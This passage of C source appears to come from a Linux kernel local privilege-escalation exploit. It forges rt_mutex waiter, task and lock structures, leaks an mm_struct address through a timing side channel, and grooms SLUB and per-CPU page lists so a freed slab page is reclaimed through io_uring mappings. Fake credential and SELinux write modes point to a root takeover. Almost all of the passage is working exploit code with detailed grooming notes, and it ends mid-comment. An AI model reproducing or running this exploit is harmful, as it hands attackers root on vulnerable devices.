    fake_left = payload_base + LEFT_OFF;
    binwrite_target = payload_base + FOPS_OFF + 0x700;
  }

  /* pc carries the COLOR BIT for the erase victim: the cred plans use
   * pc|1 (RB_BLACK) - their child != NULL keeps rebalance NULL. The
   * mode-7 ZERO write has child == NULL, so its pc must be RED
   * (bit0 clear) or __rb_erase_color would walk the fake parent. */
  uintptr_t write_pc = fake_parent;
  if (pselect_custom_write != WRITE_MODE_CRED_SELINUX)
    write_pc = fake_parent | 1;
  uintptr_t write_right = fake_right;
  uintptr_t write_left = fake_left;
  uint64_t waiter_task = fake_task;
  uint64_t task_group = text_addr(ROOT_TASK_GROUP);
  /* pi_top_task must equal fake_task so rt_mutex_setprio(fake_task,
   * pi_task=fake_task) takes the early "nothing changed" exit before it
   * ever touches p->stack/thread_info/rq (which our fake_task lacks). */
  uint64_t pi_top_task = fake_task;
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    write_pc = SLIDE_LOGGERS_0_1;
    write_right = 0;
    write_left = SLIDE_RANDOM_BOOT_ID_DATA;
    waiter_task = SLIDE_INIT_TASK;
    task_group = SLIDE_ROOT_TASK_GROUP;
    pi_top_task = SLIDE_INIT_TASK;
  }

  /* Write the payload once (at skb_buf offset 0): MM_SLAB_SIZE may be
   * larger than SKB_SEND_SIZE, in which case only the first iteration must
   * run - the simple `chunk < SKB_SEND_SIZE` condition guarantees that. */
  for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += MM_SLAB_SIZE) {
    unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;

    put32(p, LOCK_OFF + 0x00, 0);
    if (payload_mode == PAGE_PAYLOAD_SLIDE) {
      put64(p, LOCK_OFF + 0x08, fake_w0);
      put64(p, LOCK_OFF + 0x10, fake_w0);
      put64(p, LOCK_OFF + 0x18, fake_task | 1);
    } else {
      put64(p, LOCK_OFF + 0x08, fake_w0);
      put64(p, LOCK_OFF + 0x10, fake_w0);
      put64(p, LOCK_OFF + 0x18, fake_task | 1);
    }

    /* W0: fake rt_mutex_waiter on the spray page, REAL 5.15.170 layout
     * (rtmutex_common.h): 0x00 tree_entry, 0x18 pi_tree_entry, 0x30 task,
     * 0x38 lock, 0x40 wake_state(4B), 0x44 prio(4B), 0x48 deadline,
     * 0x50 ww_ctx.
     *
     * tree_entry IS dereferenced as a tree node: fake_lock->waiters.rb_root
     * points at it (payload below), so the [7] rt_mutex_enqueue inserts the
     * stack waiter UNDER W0 via rb_add_cached -> rb_insert_color_cached.
     * W0 must therefore be a BLACK root (__rb_parent_color = 0 = parent
     * NULL, black). With pc=1 (red root) rb_insert_color computes
     * gparent = rb_red_parent(parent) = NULL and derefs gparent->rb_left -
     * a NULL-page fault that took the device down the moment the walk got
     * past the [5] trylock (bug #8). */
    put64(p, W0_OFF + 0x00, 0);
    put64(p, W0_OFF + 0x08, 0);
    put64(p, W0_OFF + 0x10, 0);
    put64(p, W0_OFF + 0x18, write_pc);         /* pi_tree_entry.__rb_parent_color */
    put64(p, W0_OFF + 0x20, write_right);      /* pi_tree_entry.rb_right */
    put64(p, W0_OFF + 0x28, write_left);       /* pi_tree_entry.rb_left */
    put64(p, W0_OFF + 0x30, waiter_task);      /* task */
    /* W0.lock must equal the walk's lock pointer (rt_mutex_top_waiter's
     * BUG_ON(w->lock != lock)): fake_lock normally, the CAL_LOCK_REL
     * second-copy lock when the identity diagnostic is active. */
    {
      const char *clr = getenv("CAL_LOCK_REL");
      put64(p, W0_OFF + 0x38,
            clr ? payload_base + strtoull(clr, NULL, 0) : fake_lock);
    }
    put32(p, W0_OFF + 0x40, 0);                /* wake_state = TASK_NORMAL */
    put32(p, W0_OFF + 0x44, FAKE_WAITER_PRIO); /* prio */
    put64(p, W0_OFF + 0x48, 0);                /* deadline */
    put64(p, W0_OFF + 0x50, 0);                /* ww_ctx */

    /* usage=2: the walk's [10] get_task_struct (2->3) and the final
     * put_task_struct (3->2) stay balanced and far from zero, so the
     * kernel never calls __put_task_struct on the fake page object. */
    put32(p, FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, 2);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0);
    /* Set fake_task->cpu to a non-zero CPU so the walk's task_rq_lock
     * grabs a different rq than the main thread's (avoids starving main
     * off CPU 0 when the walk holds cpu_rq(0)->lock). */
    put32(p, FAKE_TASK_OFF + 0x58, 3);
    if (payload_mode == PAGE_PAYLOAD_FOPS) {
      /* pi_waiters empty for all FOPS modes: the dequeue_pi erase of W0
       * only consults W0.pi_tree_entry's own fields (parent != NULL so
       * the root is untouched), and enqueue_pi then inserts the stack
       * waiter as the new root/leftmost. */
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
    } else {
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
    }
    put64(p, FAKE_TASK_OFF + FAKE_TASK_TASK_GROUP_OFF, task_group);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF, pi_top_task);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);

    put64(p, RIGHT_OFF + 0x00, fake_parent);
    put64(p, RIGHT_OFF + 0x08, 0);
    put64(p, RIGHT_OFF + 0x10, 0);

    put64(p, LEFT_OFF + 0x00, fake_parent);
    put64(p, LEFT_OFF + 0x08, 0);
    put64(p, LEFT_OFF + 0x10, 0);

    /* Second fake_lock layout copy at CAL_LOCK_COPY_OFF (identity
     * diagnostic): point the overlay's lock byte here via CAL_LOCK_REL
     * and the [7] enqueue writes become visible in OUR mapping at
     * +0x3008/+0x3010 (stack-waiter addresses). If the walk still spins
     * with this lock, the kernel's view of the leaked page is NOT our
     * mapping (reclaim lost) OR the lock byte doesn't land - and the
     * readback diff tells which. W0.lock below is patched to match so
     * rt_mutex_top_waiter's BUG_ON(w->lock != lock) passes. */
    put32(p, CAL_LOCK_COPY_OFF, 0);          /* wait_lock = 0 */
    put64(p, CAL_LOCK_COPY_OFF + 0x08, fake_w0);   /* waiters.rb_root */
    put64(p, CAL_LOCK_COPY_OFF + 0x10, fake_w0);   /* waiters.rb_leftmost */
    put64(p, CAL_LOCK_COPY_OFF + 0x18, fake_task | 1); /* owner */

    if (payload_mode == PAGE_PAYLOAD_FOPS) {
      put_fake_fops_table(p, FOPS_TABLE_OFF);
      if (pselect_custom_write >= 2) {
        fill_init_cred_copy(p, CRED_COPY_OFF);
      }
      if (write_mode_is_cred(pselect_custom_write)) {
        fill_fake_cred_suite(p, payload_base);
      }
    }
  }
  return 1;
}

/* Replicate the payload template into every 16KB sub-block of a mapping.
 * Each sub-block gets a full zeroed 16KB with the payload at its start:
 * the self-referencing pointers (fake_lock/fake_w0/fake_task/fake_cred)
 * in the template address the mm page VA, and the sub-block that IS the
 * mm page backs exactly those addresses - the other copies are inert
 * look-alikes that the kernel never enters. */
static void payload_into_mapping(void *map, size_t sz) {
  size_t copy_len = SKB_SEND_SIZE < MM_SLAB_SIZE ? SKB_SEND_SIZE : MM_SLAB_SIZE;
  if (sz < MM_SLAB_SIZE)
    return;
  for (size_t off = 0; off + MM_SLAB_SIZE <= sz; off += MM_SLAB_SIZE) {
    memset((uint8_t *)map + off, 0, MM_SLAB_SIZE);
    memcpy((uint8_t *)map + off, skb_buf, copy_len);
  }
}

/* One zero-window reclaim attempt. io_uring_setup(entries):
 *   rings = __get_free_pages(get_order(rings_size(entries, 2*entries)))
 *   SQEs  = __get_free_pages(get_order(entries * 64))
 * entries=256 gives two order-2 (16KB) pages - the classic reclaim that
 * captures a discarded mm slab page from the order-2 PCP head. Larger
 * entries give order-3..7 pages: the SPECTRUM spray uses them to capture
 * the discarded page after a PCP flush pushed it into the buddy, where
 * it merges with its free buddy into higher-order blocks. Both pages
 * are fully mappable (io_uring_validate_mmap_request allows
 * sz <= page_size(page)), and every mapping carries a replicated payload
 * per 16KB sub-block. */
static int reclaim_one_uring_size(int tag, unsigned entries) {
  struct io_uring_params uring_params;
  memset(&uring_params, 0, sizeof(uring_params));
  int fd = (int)syscall(__NR_io_uring_setup, entries, &uring_params);
  if (fd < 0) {
    pr_warning("io_uring_setup[%d] entries=%u failed errno=%d\n", tag, entries, errno);
    return 0;
  }
  /* mmap sizes: the rings mapping must cover the cq array end
   * (cq_off.cqes + cq_entries*sizeof(io_uring_cqe)); the SQE mapping is
   * sq_entries*64. Both are <= the allocated compound page size, which
   * is what io_uring_validate_mmap_request enforces. */
  size_t rings_sz = (size_t)uring_params.cq_off.cqes +
                    (size_t)uring_params.cq_entries * 16;
  if (rings_sz < MM_SLAB_SIZE)
    rings_sz = MM_SLAB_SIZE;
  size_t sqes_sz = (size_t)uring_params.sq_entries * 64;
  if (sqes_sz < MM_SLAB_SIZE)
    sqes_sz = MM_SLAB_SIZE;
  void *rings = mmap(NULL, rings_sz, PROT_READ | PROT_WRITE,
                     MAP_SHARED | MAP_POPULATE, fd, 0 /*IORING_OFF_SQ_RING*/);
  if (rings == MAP_FAILED) {
    pr_warning("io_uring rings mmap[%d] sz=%zx errno=%d\n", tag, rings_sz, errno);
    close(fd);
    return 0;
  }
  void *sqes = mmap(NULL, sqes_sz, PROT_READ | PROT_WRITE,
                     MAP_SHARED | MAP_POPULATE, fd, IORING_OFF_SQES);
  if (sqes == MAP_FAILED) {
    pr_warning("io_uring sqes mmap[%d] sz=%zx errno=%d\n", tag, sqes_sz, errno);
    munmap(rings, rings_sz);
    close(fd);
    return 0;
  }
  if (env_flag("RECLAIM_DEBUG", 0) && entries == 256) {
    /* Pre-payload rings-header sanity (handover_2 §5.1): at setup
     * io_allocate_scq_urings writes exactly four u32s into the rings page
     * (sq/cq ring_mask and ring_entries, published via io_uring_params);
     * the rest of the page is __GFP_ZERO. Those four must read back as
     * 255/511/256/512, otherwise the mapping is not a fresh rings page.
     * A nonzero word beyond the header means the mapping and the kernel
     * disagree about this page. */
    uint32_t sq_mask = *(uint32_t *)((uint8_t *)rings + uring_params.sq_off.ring_mask);
    uint32_t cq_mask = *(uint32_t *)((uint8_t *)rings + uring_params.cq_off.ring_mask);
    uint32_t sq_n = *(uint32_t *)((uint8_t *)rings + uring_params.sq_off.ring_entries);
    uint32_t cq_n = *(uint32_t *)((uint8_t *)rings + uring_params.cq_off.ring_entries);
    int hdr_ok = sq_mask == uring_params.sq_entries - 1 &&
                 cq_mask == uring_params.cq_entries - 1 &&
                 sq_n == uring_params.sq_entries &&
                 cq_n == uring_params.cq_entries;
    uint64_t nz_off = 0, nz_val = 0;
    for (size_t off = 0; off + 8 <= MM_SLAB_SIZE; off += 8) {
      size_t lo = off, hi = off + 7;
      size_t m0 = uring_params.sq_off.ring_mask;
      size_t m1 = uring_params.sq_off.ring_entries + 3;
      size_t c0 = uring_params.cq_off.ring_mask;
      size_t c1 = uring_params.cq_off.ring_entries + 3;
      if ((hi >= m0 && lo <= m1) || (hi >= c0 && lo <= c1))
        continue;
      uint64_t v = *(uint64_t *)((uint8_t *)rings + off);
      if (v) { nz_off = off; nz_val = v; break; }
    }
    pr_info("RECLAIM[%02d] rings hdr sq_mask=%u cq_mask=%u sq_n=%u cq_n=%u %s "
            "first-nonzero=%#zx:%#llx\n",
            tag, sq_mask, cq_mask, sq_n, cq_n,
            hdr_ok ? "OK" : "BAD (not a rings page)",
            (size_t)nz_off, (unsigned long long)nz_val);
  }
  payload_into_mapping(rings, rings_sz);
  payload_into_mapping(sqes, sqes_sz);
  if (uring_count + 2 <= URING_MAX) {
    uring_fds[uring_count] = fd;
    uring_maps[uring_count] = rings;
    uring_mapsz[uring_count] = rings_sz;
    uring_count++;
    uring_maps[uring_count] = sqes;
    uring_mapsz[uring_count] = sqes_sz;
    uring_count++;
  }
  if (uring_fd < 0) {
    uring_fd = fd;
    uring_sqes = sqes;
  }
  return 1;
}

/* The classic order-2 reclaim: io_uring_setup(256) -> two 16KB pages. */
static int reclaim_one_uring(int tag) {
  return reclaim_one_uring_size(tag, 256);
}

uintptr_t prepare_kernel_page(int payload_mode) {
  close_reclaim_sockets();
  /* Free the PREVIOUS attempt's MOVABLE-storm region (2GB RAM - a new
   * attempt would otherwise stack another 128MB and OOM the device). */
  if (g_storm_region && g_storm_size) {
    munmap(g_storm_region, g_storm_size);
    if (uring_count > 0 && uring_maps[uring_count - 1] == g_storm_region) {
      uring_count--;
      uring_maps[uring_count] = NULL;
      uring_mapsz[uring_count] = 0;
      uring_mapstride[uring_count] = 0;
    }
    g_storm_region = NULL;
    g_storm_size = 0;
    g_storm_block_start = -1;
  }
  /* Pin BEFORE any mm is allocated: every child's mm_struct is allocated in
   * the PARENT's context (copy_mm during clone), so with the parent pinned
   * to CORE all the mm allocations come from CORE's mm_cachep slab stream.
   * The prepare/spray children consume the per-cpu and node partial slabs
   * first; the target run (pre/leak/post) then very likely lands on FRESH
   * pages whose 8 objects are all ours. If the target slab is a system
   * partial slab instead, it can contain foreign live mms, the page can
   * never be emptied and the discard (and the whole reclaim) fails. */
  pin_to_core(CORE);
  mm_objs_per_slab = MM_SLAB_SIZE / MM_STRUCT_SZ;
  prepare_ctxs();

  skb_buf = malloc(SKB_SEND_SIZE);
  memset(skb_buf, 0x41, SKB_SEND_SIZE);

  /* KernelSnitch state first: it only mmaps user memory and never
   * allocates an mm, so it can run before the child burst and creates no
   * gap between the last prepare/spray clone and the target run. */
  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  pr_info("KernelSnitch setup: cpus=%d mm_per_slab=%zu prep=%zu spray=%zu "
          "pre=%zu post=%zu\n",
          cpu_count, mm_objs_per_slab, prepare_ctx.mm_cnt, spray_ctx.mm_cnt,
          pre_ctx.mm_cnt, post_ctx.mm_cnt);
  ks = kernelsnitch_setup(
      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS,
      env_int_range("KSNITCH_VERBOSE", 0, 0, 1), 0);
  pr_info("KernelSnitch parameters: threads=%zu collisions=%zu futexes=%zu "
          "identity_step=0x%zx\n",
          ks->thread_cnt, ks->collisions, ks->total_futexes,
          ks->identity_diff);

  /* UNMOVABLE ORDER-2 SEED (migratetype control for the target slab).
   * A slab page's migratetype is fixed at ALLOCATION time: if the
   * buddy's UNMOVABLE freelist happens to be empty when mm_cachep
   * allocates a new slab, the page allocator falls back to a MOVABLE
   * block and the page is typed MIGRATE_MOVABLE forever. On discard
   * it then lands on the per-cpu PCP MOVABLE order-2 list - and the
   * PCP serves ONLY the requested migratetype (no fallback), so no
   * GFP_KERNEL allocation - including every io_uring reclaim ring -
   * can ever take it: the capture misses 100% (the on-device collapse
   * of the reclaim rate; the freed page stays untouched, verified by
   * the stale mm->start_code still being in the panic registers).
   *
   * Seed the UNMOVABLE order-2 pool right before the child burst:
   * allocate a pile of io_uring rings (GFP_KERNEL_ACCOUNT = UNMOVABLE
   * order-2 pages), then close them all so mm_cachep's slab
   * allocations for the child burst draw fresh UNMOVABLE-typed pages
   * (from the PCP order-2 UNMOVABLE head or the buddy UNMOVABLE list).
   * The target page is then UNMOVABLE-typed and the discard lands on
   * the PCP UNMOVABLE order-2 head, where the drain-loop io_uring
   * allocation takes it - the original capture design. */
  if (env_flag("UNMOVABLE_SEED", 1)) {
    int seed_rings = env_int_range("UNMOVABLE_SEED_RINGS", 200, 0, 220);
    int seeded = 0;
    for (int i = 0; i < seed_rings; i++) {
      if (!reclaim_one_uring(-100 - i))
        break;
      seeded++;
    }
    for (int i = 0; i < seeded; i++) {
      int m0 = 2 * i;
      if (uring_maps[m0])
        munmap(uring_maps[m0], uring_mapsz[m0] ? uring_mapsz[m0] : MM_SLAB_SIZE);
      if (uring_maps[m0 + 1])
        munmap(uring_maps[m0 + 1],
               uring_mapsz[m0 + 1] ? uring_mapsz[m0 + 1] : MM_SLAB_SIZE);
      if (uring_fds[m0] >= 0)
        close(uring_fds[m0]);
    }
    pr_info("unmovable seed: %d rings allocated+freed (%d order-2 UNMOVABLE "
            "pages back to the pool)\n", seeded, seeded * 2);
    uring_count = 0;
    uring_fd = -1;
    uring_sqes = NULL;
    for (int i = 0; i < URING_MAX; i++) {
      uring_fds[i] = -1;
      uring_maps[i] = NULL;
      uring_mapsz[i] = 0;
      uring_mapstride[i] = 0;
    }
  }

  /* TIGHT child burst: prepare -> spray -> pre -> leak -> post with NO
   * intervening syscall (the /proc/<pid>/mem opens happen afterwards).
   * Each clone allocates exactly one mm_struct in this task on CORE. */
  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++)
    prepare_ctx.childs[i] = clone_child();
  for (size_t i = 0; i < spray_ctx.mm_cnt; i++)
    spray_ctx.childs[i] = clone_child();
  for (size_t i = 0; i < pre_ctx.mm_cnt; i++)
    pre_ctx.childs[i] = clone_child();
  child_leak = clone_leak_child();
  for (size_t i = 0; i < post_ctx.mm_cnt; i++)
    post_ctx.childs[i] = clone_child();

  /* Open the /proc/<pid>/mem fds (each holds an mm_count ref - the dead
   * child's mm_struct stays allocated until we close the fd in the reclaim
   * choreography). The leak child runs find_collisions in parallel from
   * here on. */
  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++)
    prepare_ctx.memfds[i] = open_memfd(prepare_ctx.childs[i]);
  for (size_t i = 0; i < spray_ctx.mm_cnt; i++)
    spray_ctx.memfds[i] = open_memfd(spray_ctx.childs[i]);
  for (size_t i = 0; i < pre_ctx.mm_cnt; i++)
    pre_ctx.memfds[i] = open_memfd(pre_ctx.childs[i]);
  memfd_leak = open_memfd(child_leak);
  for (size_t i = 0; i < post_ctx.mm_cnt; i++)
    post_ctx.memfds[i] = open_memfd(post_ctx.childs[i]);

  /* NOTE: the pre/post/spray/leak children are deliberately kept ALIVE
   * through the bruteforce (bug #7 fix): they hold the target slab page
   * FULL, i.e. unlisted in SLUB and unreachable for allocations. They
   * are killed in the reclaim kill phase below, right before the
   * io_uring spray. */

  /* Wait for the leak child to finish the collision phase: it runs
   * asynchronously in the forked child and publishes the result in the
   * shared ks state. (The old flow synchronized via waitpid(child_leak),
   * which has moved to the kill phase.) */
  {
    int wait_ms = 0;
    while (ks->state == KERNELSNITCH_INIT && wait_ms < 120000) {
      usleep(1000);
      wait_ms++;
    }
  }
  int collisions_found = (int)kernelsnitch_found_collisions(ks);
  pr_info("KernelSnitch collisions: %s\n",
          collisions_found ? "found" : "not found");
  if (!collisions_found) {
    pr_warning("KernelSnitch collision finding failed\n");
    kernelsnitch_cleanup(ks);
    ks = NULL;
    cleanup_page_prepare_state();
    return 0;
  }

  kernelsnitch_bruteforce(ks);
  uintptr_t leaked = ks->mm_struct;
  /* Validate the leaked address: mm_cachep objects have stride 1024
   * (s->size = ALIGN(984, 64)) and the 16KB order-2 slab holds exactly 16
   * of them, so every offset 0,1024,...,15360 is a real object slot (no
   * slack). A leaked address that is not 1024-aligned cannot be an mm and
   * is rejected so prepare_good_kernel_page retries. */
  if ((leaked & (MM_SLAB_SIZE - 1)) % MM_STRUCT_SZ != 0) {
    pr_warning("ksnitch leak 0x%zx is not a real mm object (off=0x%zx, not %d-aligned) - retrying\n",
               leaked, (size_t)((leaked & (MM_SLAB_SIZE - 1))),
               (int)MM_STRUCT_SZ);
    kernelsnitch_cleanup(ks);
    ks = NULL;
    cleanup_page_prepare_state();
    return 0;
  }
  pr_info("ksnitch leak 0x%zx validated: object %zu of the slab\n",
          leaked, (size_t)((leaked & (MM_SLAB_SIZE - 1)) / MM_STRUCT_SZ));
  pr_info("KernelSnitch bruteforce: state=%d found=%zu mm_struct=0x%zx\n",
          ks->state, ks->found, leaked);
  last_mm_struct = leaked;
  if (leaked == (uintptr_t)-1) {
    pr_warning("KernelSnitch mm_struct leak failed\n");
    kernelsnitch_cleanup(ks);
    ks = NULL;
    cleanup_page_prepare_state();
    return 0;
  }

  uintptr_t base = leaked & ~(MM_SLAB_SIZE - 1);
  if (!prepare_skb_payload(base, payload_mode)) {
    kernelsnitch_cleanup(ks);
    ks = NULL;
    cleanup_page_prepare_state();
    return 0;
  }

  SYSCHK(socketpair(AF_UNIX, SOCK_DGRAM, 0, reclaim_sv));
  int sndbuf = 1 << 20;
  setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
  setsockopt(reclaim_sv[1], SOL_SOCKET, SO_RCVBUF, &sndbuf, sizeof(sndbuf));
  int reclaim_flags = fcntl(reclaim_sv[0], F_GETFL, 0);
  if (reclaim_flags >= 0) {
    fcntl(reclaim_sv[0], F_SETFL, reclaim_flags | O_NONBLOCK);
  }
  int pcp_shaping_sv[2];
  SYSCHK(socketpair(AF_UNIX, SOCK_DGRAM, 0, pcp_shaping_sv));

  struct iovec iov;
  memset(&iov, 0, sizeof(iov));
  iov.iov_base = skb_buf;
  iov.iov_len = SKB_SEND_SIZE;

  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  for (int i = 0; i < 4; i++) {
    errno = 0;
    ssize_t sent = sendmsg(pcp_shaping_sv[0], &msg, MSG_DONTWAIT);
    if (sent <= 0) break;
  }

  pin_to_core(CORE);
  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();

  /* Pre-warm the allocators while the target page is still FULL (safe):
   *  - kmalloc-2k (io_ring_ctx) gets partial slabs, so the post-discard
   *    io_uring setups never allocate a fresh order-3 page - such a page
   *    could otherwise capture a merged block containing the target and
   *    fill it with kernel data instead of our payload;
   *  - the rings/SQE allocations drain the PCP order-2 list, lowering the
   *    chance that the discarded target is immediately flushed to the
   *    buddy (where it can merge). */
  if (env_flag("USE_URING", 1)) {
    for (int i = 0; i < 4; i++)
      reclaim_one_uring(-1 - i);
    pr_info("uring pre-warm: %d rings\n", uring_count / 2);
  }

  /* ---- Reclaim kill phase (bug #7 fix): empty the target slab page
   * and force SLUB to DISCARD it to the page allocator, deterministically.
   *
   * mm_cachep: order-2 slabs, 16 objects of 976 bytes, cpu_partial = 13,
   * min_partial = 5 (ilog2(976)/2 clamped to MIN_PARTIAL).
   *
   * With CONFIG_SLUB_CPU_PARTIAL=y the fate of a fully-freed page is:
   *  - freed into a FULL page (first free): __slab_free sets new.frozen
   *    and put_cpu_partial() FREEZES it on this CPU's partial list. NOT
   *    returned to the page allocator.
   *  - subsequent frees into it: FREE_FROZEN, no list activity.
   *  - discard ONLY happens in __unfreeze_partials (runs when a
   *    put_cpu_partial(drain=1) overflows: accumulated pobjects > 13)
   *    and only for batch pages with inuse == 0 while the node's
   *    nr_partial >= min_partial (5).
   *  - a page emptied while it sits on the NODE partial list takes the
   *    direct slab_empty path in __slab_free (synchronous
   *    discard_slab -> __free_pages -> PCP) whenever nr_partial >= 5.
   *
   * The old code killed all holder children BEFORE the minutes-long
   * bruteforce: the page emptied, froze onto a CPU partial list and was
   * then either eaten by a background fork (popped as the active slab,
   * re-pinned with live mms) or never unfrozen at all - it never reached
   * the page allocator, so the io_uring spray reclaimed other pages and
   * the walk spun at [5] on stale slab data.
   *
   * The order below guarantees the discard, synchronously, immediately
   * before the reclaim spray (all children run pinned on CORE, so every
   * free, every CPU-partial push and the final PCP entry land on the CPU
   * that then runs io_uring):
   *  1. kill pre[all] and post[all]: the target page takes its first free
   *     and FREEZES onto CORE's CPU partial list (put_cpu_partial); its
   *     remaining residents are all our pre/post mms, so it empties down
   *     to inuse = 1: the alive leak child's mm.
   *  2. kill one spray child per slab: a few more page pushes.
   *  3. kill the LEAK CHILD while the target page is still FROZEN. A
   *     frozen page is invisible to every other CPU (not on the node
   *     partial list yet), so no background mm allocation can take it
   *     while it still has 15 free objects. Its last free only sets
   *     inuse = 0 (__slab_free returns early on the was_frozen path).
   *  4. DRAIN kills: one prepare child per full prepare slab
   *     (DRAIN_KILLS, default 24). Each first free into a full page
   *     pushes +1 pobject; when the accumulated pobjects exceed
   *     cpu_partial (13) the __unfreeze_partials drain runs, growing the
   *     node nr_partial past min_partial (5) with the inuse > 0 batch
   *     pages and DISCARDING the inuse == 0 target page:
   *     discard_slab -> __free_pages -> TOP of CORE's order-2 PCP.
   *  The io_uring spray right below then allocates rings+SQE pages
   *  (the only order-2 consumers: ctx/skb allocations are order 3) and
   *  gets the target page. The post-discard exposure is only the rest of
   *  the drain loop instead of the whole drain + leak window.
   *
   * If the CPU partial list had already overflowed before step 3, the
   * target page is on the node partial list at the leak kill and the
   * direct slab_empty path discards it immediately - also correct.
   *
   * HOW THE FREES ACTUALLY HAPPEN: the kills below only reap the dead
   * tasks - every child's mm_struct stays allocated because its
   * /proc/<pid>/mem fd is still open (proc_mem_open -> mmgrab holds
   * mm_count). That is what keeps the target page FULL and unlisted
   * through the whole bruteforce. The mms are freed later, IN THIS
   * TASK'S CONTEXT ON CORE, by closing those mem fds (in the reclaim
   * choreography below): close() -> fput -> __fput -> mem_release ->
   * mmdrop -> __mmdrop -> kmem_cache_free, the free runs as task_work on
   * the exit-to-user path of the close() syscall, so it is complete and
   * on CORE before the next syscall we make. (Closing the fds after the
   * reclaim - or not killing the children - leaves every mm allocated and
   * the page can never be discarded.) */
  /* FLUSH victims: one object of each of 16 distinct FULL prepare slabs.
   * Closing their mem fds below pushes +1 pobject each, which FORCES a
   * CPU-partial overflow at the very start of the choreography. Without
   * this, a leftover accumulator (pobjects already > 13 from background
   * process exits on CORE) makes the TARGET's first free unfreeze it
   * straight onto the NODE partial list, where any CPU's get_partial can
   * hand it to a background fork for the rest of the choreography - the
   * page then never empties and the whole discard/reclaim fails (the
   * racy failure seen in run 10). */
#define FLUSH_KILLS 8
  for (int i = 0; i < FLUSH_KILLS; i++) {
    size_t idx = (size_t)i * mm_objs_per_slab;
    if (idx < prepare_ctx.mm_cnt && prepare_ctx.childs[idx] > 0) {
      kill_child(prepare_ctx.childs[idx]);
      prepare_ctx.childs[idx] = 0;
    }
  }
  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    kill_child(pre_ctx.childs[i]);
    pre_ctx.childs[i] = 0;
  }
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    kill_child(post_ctx.childs[i]);
    post_ctx.childs[i] = 0;
  }
  for (size_t i = 0; i < spray_ctx.mm_cnt; i += mm_objs_per_slab) {
    kill_child(spray_ctx.childs[i]);
    spray_ctx.childs[i] = 0;
  }
  /* The leak child dies while the target page is still FROZEN on CORE's
   * CPU partial list (step 3 above). The mem fd is still open - the mm
   * survives the kill and is freed by the close choreography below.
   * sched_yield forces the final context switch of the dying task, so the
   * whole thread group is gone before we start freeing mms. */
  kill_child(child_leak);
  child_leak = 0;
  sched_yield();

  /* ---- Free/reclaim choreography, entirely in this task on CORE ----
   * Each close() of a dead child's mem fd drops the last mm_count ref
   * (mem_release -> mmdrop): the mm free runs in this task's task_work,
   * on CORE, before the next syscall. Order matters:
   *   0. FLUSH: close the 16 flush mem fds -> 16 CPU-partial pushes -> a
   *      guaranteed overflow that resets the accumulator, so nothing can
   *      unfreeze the target early.
   *   1. close the pre mem fds: the target page takes its first free and
   *      FREEZES onto CORE's (fresh) CPU partial list (head pobjects ~3).
   *   2. close the post mem fds: the target empties further (head ~4-6).
   *   3. close the leak mem fd: the target page is now inuse == 0 but
   *      still FROZEN (private to CORE, invisible to every other CPU).
   *      The head pobjects is ~4-6, FAR below the 13 overflow threshold:
   *      nothing can unfreeze the half-empty target onto the node partial
   *      list, where a background fork would capture it.
   *   4. drain: close one prepare mem fd per full prepare slab (one
   *      first-free = +1 pobject) and try one order-2 reclaim, 24 times.
   *      At pobjects > 13 the __unfreeze_partials drain runs and DISCARDS
   *      the inuse == 0 target page (processed last: it is the oldest page
   *      in the batch, after the inuse > 0 pages have grown the node
   *      nr_partial past min_partial) -> top of CORE's order-2 PCP; the
   *      next reclaim_one_uring() takes it.
   *   5. the spray mem fds are closed after the drain: their pushes must
   *      not bring the accumulator near the threshold while the target
   *      still holds live objects. */
  for (int i = 0; i < FLUSH_KILLS; i++) {
    size_t idx = (size_t)i * mm_objs_per_slab;
    if (idx < prepare_ctx.mm_cnt && prepare_ctx.memfds[idx] > 0) {
      close(prepare_ctx.memfds[idx]);
      prepare_ctx.memfds[idx] = -1;
    }
  }
  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    if (pre_ctx.memfds[i] > 0) {
      close(pre_ctx.memfds[i]);
      pre_ctx.memfds[i] = -1;
    }
  }
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    if (post_ctx.memfds[i] > 0) {
      close(post_ctx.memfds[i]);
      post_ctx.memfds[i] = -1;
    }
  }
  if (memfd_leak > 0) {
    close(memfd_leak);
    memfd_leak = -1;
  }

  /* GHOST_TEST=1 keeps the erase skipped: make W0's pi_tree entry look
   * like an RB_EMPTY_NODE (__rb_parent_color == its own address) in the
   * payload buffer before ANY copy (io_uring or skb). */
  if (env_int_range("GHOST_TEST", 0, 0, 1) == 1) {
    put64(skb_buf, W0_OFF + 0x18,
          (last_mm_struct & ~(MM_SLAB_SIZE - 1)) + W0_OFF + 0x18);
  }

  /* PCP DRAIN BURST: the discarded target page is only reliably
   * capturable while it sits at the head of the order-2 PCP list. If
   * pcp->count >= high at its commit, free_unref_page_commit immediately
   * flushes it to the buddy, where it merges with its (usually free)
   * buddy and is buried in a higher-order block that our order-2/3
